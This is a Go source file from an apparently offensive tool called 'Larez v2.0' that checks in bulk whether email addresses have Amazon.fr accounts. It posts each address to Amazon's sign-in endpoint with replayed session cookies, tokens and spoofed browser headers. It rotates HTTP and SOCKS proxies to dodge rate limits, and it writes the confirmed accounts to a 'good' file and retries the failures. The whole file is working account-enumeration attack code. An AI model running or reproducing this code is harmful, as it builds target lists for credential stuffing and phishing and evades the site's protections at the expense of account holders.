package amazon

import (
	"awesomeProject/modules"
	"awesomeProject/utils"
	"github.com/pterm/pterm"
	"golang.org/x/net/proxy"
	"h12.io/socks"
	"io"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"time"
)

var good int64 = 0
var bad int64 = 0
var total int64 = 0
var error int64 = 0

func StartEmailChecker(emails []string, proxies []string, mode string)  {
	goodLog := pterm.NewStyle(pterm.FgGreen)
	badLog := pterm.NewStyle(pterm.FgRed)
	errLog := pterm.NewStyle(pterm.FgLightYellow)

	var debounceIdentifier = "Amazon" + modules.DebounceIdentifier

	_, err := os.Stat("./results/good/" + debounceIdentifier)
	_, err = os.Stat("./results/bad/" + debounceIdentifier)
	var goodFile *os.File
	var badFile *os.File

	if os.IsNotExist(err) {
		goodFile, _ = os.Create("./results/good/" + debounceIdentifier)
		badFile, _ = os.Create("./results/bad/" + debounceIdentifier)
	} else {
		goodFile, _ = os.Open("./results/good/" + debounceIdentifier)
		badFile, _ = os.Open("./results/bad/" + debounceIdentifier)
	}

	var goodMails []string
	var badMails []string
	var errorsMails []string
	var wg sync.WaitGroup
	var mu sync.Mutex


	modules.EmailCheck(
		func(email string, wg *sync.WaitGroup, proxyS string, mu *sync.Mutex) {
			defer wg.Done()
			httpTransport := &http.Transport{}

			if mode == "recheck" {
				proxyS = proxies[rand.Int() % len(proxies)]
			}

			if !modules.IsProxylessMode {
				if modules.ProxyType == "HTTP" {
					proxyUrl, _ := url.Parse("http://" + proxyS)
					httpTransport.Proxy = http.ProxyURL(proxyUrl)

				} else if modules.ProxyType == "SOCKS4" {
					dial := socks.Dial("socks4://" + proxyS)
					httpTransport.Dial = dial

				} else if modules.ProxyType == "SOCKS5" {
					dialer, err := proxy.SOCKS5("tcp", proxyS, nil, proxy.Direct)
					if err != nil {
						mu.Lock()
						errorsMails = append(errorsMails, email)
						error++
						total++
						defer mu.Unlock()

						return
					}
					httpTransport.Dial = dialer.Dial
				}
			}

			client := &http.Client{Transport: httpTransport}

			if modules.IsProxylessMode {
				client = &http.Client{}
			}

			payload := strings.NewReader(`appActionToken=Yq2mhgfDpdFgAc7Q0195zsKMhMgj3D&appAction=SIGNIN_PWD_COLLECT&subPageType=SignInClaimCollect&metadata1=ECdITeCs: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&openid.return_to=ape:aHR0cHM6Ly93d3cuYW1hem9uLmZyLz9yZWZfPW5hdl9zaWduaW4=&prevRID=ape:MDU0NEE2SjhFRlFRUTYyN1dKVjQ=&workflowState=eyJ6aXAiOiJERUYiLCJlbmMiOiJBMjU2R0NNIiwiYWxnIjoiQTI1NktXIn0.82kD-hdrp3qMJkrTTdkc7Kc08KLPQBHL_iQoQ2pjIS8D31IZSfbInA.90U5VKcKctZvMWjr.o5bTk4T5fy7FanxrQ70Wd9a7Yeg7j8PwNCf31MdIe_tCA2xU4aDIeFto4vZZ_WOuNIRDKX3wCSfPtNeRwWKZSYEf9iy5STM6hyqrBd8dn6HAj2scs056iFAFf6nbuTvZzZ4PMNkbe9XAlm49L9UhlE2WhNYp9J1C4v_BKloM8634tt3qqr6TJmE7sF2ALES8v27bQGYVbC0TT7gnvRhbd2J9KiXpNRw3ksFN9hxvbOmHSMd5yQ4LS9h8BxNWmO0d5_687P05l20JZ6TJHdY1-JD2aNnK4Gp96DGTQu2WYKexFuz0-wo3RJVqcJJUGQTTIKz9._B41CuwhGFlx-f0Rgma_bA&email=` + email + `&password=&create=0`)

			req, _ := http.NewRequest("POST", "https://www.amazon.fr/ap/signin", payload)

			req.Header.Add("accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9")
			req.Header.Add("accept-encoding", "gzip, deflate, br")
			req.Header.Add("accept-language", "fr,en-US;q=0.9,en;q=0.8")
			req.Header.Add("cache-control", "max-age=0")
			req.Header.Add("content-type", "application/x-www-form-urlencoded")
			req.Header.Add("cookie", `signin-sso-state-fr=9a588507-c1d0-47d2-9b4e-24660962a172; session-id=259-0765909-8490911; ubid-acbfr=257-0984503-1653536; s_cc=true; s_nr=1628038460339-New; s_vnum=2060038460339%26vn%3D1; s_dslv=1628038460342; s_sq=%5B%5BB%5D%5D; s_ppv=28; lc-acbfr=fr_FR; sst-acbfr=Sst1|PQF8-IR2JwMpPCYbuYCWXsn0CUByhtpw3G-ru2dOH1cCAwob0wV9_PHM53N5vhYwOh_10q-TmrnyJiDIubhN1vQRwdPX6zr81XepEK4gwVCPuknVsOTraJuLC0KTDLWGpSH1zA7fOq5sI8sp8fDRlnH1nLMf1LgfkKNoSMXBG-bfJLJhyF5VfnhJ_ARRFXOqeEDXqYsSFjZOevjChkRdY4s7xdFORfxpv-R00B-KXv6bpxR5aMOjnQqHGWrJlldWQaAaFYqSpQ-DsuQfb4D5C1_Mrnc7AKc8KU9WPCsuxnvlu1w; i18n-prefs=EUR; session-token=79xix76gKPVVnFiaW9dcHSh+Um4/4J7yi5BR0BAjliXf2Cun5JLeD2BpFKgO1kZsu6ialy8NtAj9qauNFQgn7fHycrZVdsrloQ80RCMZAHbt/T1mWOxDYofcMLA46ZrcaBo1ad7d4dhlfpsZpeEYXjY6OrkE2oZJXv8GCZ3b64qVcmNDT6GuNEdiQSApa9f1CWCU/DwpfDeFd96cXaZltct5FJuJJ1PCv5++TQHAXogh56Hp4H6dkOetF2AAXHzc2cHoMDZFvQ0=; session-id-time=2259697171l; csm-hit=tb:CCFXXEQY6J81PR2CX5JM+b-1QVH157HS0JKGH9N9B30|1628977179563&t:1628977179563&adb:adblk_yes`)
			req.Header.Add("downlink", "10")
			req.Header.Add("ect", "4g")
			req.Header.Add("origin", "https://www.amazon.fr")
			req.Header.Add("referer", "https://www.amazon.fr/ap/signin?openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F%3Fref_%3Dnav_signin&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.assoc_handle=frflex&openid.mode=checkid_setup&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0&")
			req.Header.Add("rtt", "150")
			req.Header.Add("sec-ch-ua-mobile", "?0")
			req.Header.Add("sec-fetch-dest", "document")
			req.Header.Add("sec-fetch-mode", "navigate")
			req.Header.Add("sec-fetch-site", "same-origin")
			req.Header.Add("sec-fetch-user", "?1")
			req.Header.Add("upgrade-insecure-requests", "1")
			req.Header.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36")

			req.Close = true
			resp, err := client.Do(req)

			if err != nil {
				mu.Lock()
				errorsMails = append(errorsMails, email)
				error++
				total++
				defer mu.Unlock()

				return
			}

			defer func(Body io.ReadCloser) {
				err := Body.Close()
				if err != nil {
					mu.Lock()
					errorsMails = append(errorsMails, email)
					error++
					total++
					defer mu.Unlock()

					return
				}
			}(resp.Body)

			body, _ := ioutil.ReadAll(resp.Body)
			stringBody := string(body)

			if strings.Contains(stringBody, "Entrez votre mot de passe") || strings.Contains(stringBody, "Réinitialisation du mot de passe requise") {
				mu.Lock()
				good++
				goodLog.Println("[GOOD] " + strconv.FormatInt(total, 10) +  " - " + email)
				goodMails = append(goodMails, email)
				goodFile.Write([]byte(email + "\n"))
				defer mu.Unlock()

			} else if strings.Contains(stringBody,"Impossible de trouver un compte correspondant à cette adresse e-mail") {
				mu.Lock()
				bad++
				badLog.Println("[BAD] " + strconv.FormatInt(total, 10) +  " - " + email)
				badMails = append(badMails, email)
				badFile.Write([]byte(email + "\n"))
				defer mu.Unlock()

			} else {
				mu.Lock()
				error++
				errorsMails = append(errorsMails, email)
				defer mu.Unlock()

			}

			mu.Lock()
			total++
			defer mu.Unlock()

			_, _ = utils.SetConsoleTitle("Larez v2.0 | Checked:" + strconv.FormatInt(total, 10) + " - Hits: "+ strconv.FormatInt(good, 10) +" - Bad: "+strconv.FormatInt(bad, 10)+" | " + "Errors: " + strconv.FormatInt(int64(len(errorsMails)), 10))

		},
		emails,
		&wg,
		proxies,
		&mu,
	)

	errLog.Println("Finished Larezed " + strconv.FormatInt(total, 10) + " mails! | Goods: " + strconv.FormatInt(good, 10) + " mails - Bads: " + strconv.FormatInt(bad, 10) + " mails ! | Errors: " + strconv.FormatInt(int64(len(errorsMails)), 10))

	if len(errorsMails) > 50 {
		errLog.Println("\nError checker will start in few seconds ! please wait...")
		time.Sleep(10)
		StartEmailChecker(errorsMails, proxies, "recheck")
		utils.ClearConsole()
	}
}